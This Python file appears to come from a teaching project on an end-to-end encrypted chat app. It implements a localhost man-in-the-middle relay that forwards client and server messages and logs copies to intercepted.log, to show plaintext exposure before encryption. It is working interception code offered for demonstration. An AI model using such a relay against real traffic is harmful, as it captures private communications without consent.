"""mitm.py — a man-in-the-middle that sits between a client and the server (UC-2).

It listens where clients expect the server, forwards every message to the real
server so the chat still works, and logs a copy of each one to intercepted.log.
In the plaintext build the log is readable; after E2EE it will be ciphertext.
"""

import socket
import threading
from datetime import datetime

from e2ee_chat.protocol import recv_msg, send_msg

LISTEN_HOST = "127.0.0.1"   # this machine
LISTEN_PORT = 6060          # where clients connect, thinking it's the server
SERVER_HOST = "127.0.0.1"   # the real server
SERVER_PORT = 5050          # the real server's port
LOG_FILE = "intercepted.log"

def log_message(direction, msg):
    """Write one intercepted message to the log file and print it on screen."""
    timestamp = datetime.now().strftime("%H:%M:%S")
    line = f"[{timestamp}] {direction} {msg}"
    print("[mitm]", line)                 # show it in the attacker's terminal
    with open(LOG_FILE, "a") as f:        # "a" = add to the end, don't erase
        f.write(line + "\n")


def pump(source, destination, direction):
    """Read messages from source, log them, and pass them to destination.

    This runs in a loop until one side hangs up. One pump handles one
    direction; we run two of them so both directions flow at once.
    """
    while True:
        msg = recv_msg(source)      
        if msg is None:             
            break
        log_message(direction, msg) 
        send_msg(destination, msg)  


def handle_client(client_sock):
    """One client connected to us. Connect to the real server and relay both ways."""
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.connect((SERVER_HOST, SERVER_PORT))

    threading.Thread(
        target=pump, args=(client_sock, server_sock, "client->server"), daemon=True
    ).start()
    pump(server_sock, client_sock, "server->client")


def main():
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((LISTEN_HOST, LISTEN_PORT))
    listener.listen()
    print(f"[mitm] listening on {LISTEN_HOST}:{LISTEN_PORT}, forwarding to {SERVER_PORT}")

    while True:
        client_sock, addr = listener.accept()
        print(f"[mitm] client connected from {addr}")
        threading.Thread(target=handle_client, args=(client_sock,), daemon=True).start()


if __name__ == "__main__":
    main()